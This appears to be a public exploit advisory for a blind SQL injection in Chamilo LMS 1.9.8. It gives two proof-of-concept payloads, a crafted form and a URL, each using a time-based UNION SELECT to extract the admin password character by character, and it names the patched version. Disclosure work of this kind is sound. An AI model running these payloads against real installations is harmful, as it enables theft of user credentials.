@@ -1,0 +1,36 @@
+# Exploit Title: Chamilo LMS 1.9.8 Blind SQL Injection
+# Date: 06-12-2014
+# Software Link: http://www.chamilo.org/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+
+1. Description
+  
+Database::escape_string() function is used to sanitize data but it will work only in two situations: "function_output" or 'function_output'.
+
+There is few places where this function is used without quotation marks.
+
+http://security.szurek.pl/chamilo-lms-198-blind-sql-injection.html
+
+2. Proof of Concept
+
+For this exploit you need teacher privilege (api_is_allowed_to_edit(false, true)) and at least one forum category must exist (get_forum_categories()).
+
+<form method="post" action="http://chamilo-url/main/forum/?action=move&content=forum&SubmitForumCategory=1&direction=1&id=0 UNION (SELECT IF(substr(password,1,1) = CHAR(100), SLEEP(5), 0) FROM user WHERE user_id = 1)">
+    <input type="hidden" name="SubmitForumCategory" value="1">
+    <input type="submit" value="Hack!">
+</form>
+
+For second exploit you need administrator privilege (there is no CSRF protection):
+
+http://chamilo-url/main/reservation/m_category.php?action=delete&id=0 UNION (SELECT IF(substr(password,1,1) = CHAR(100), SLEEP(5), 0) FROM user WHERE user_id = 1)
+
+Those SQL will check if first password character user ID=1 is "d".
+
+  
+3. Solution:
+  
+Update to version 1.9.10
+https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues
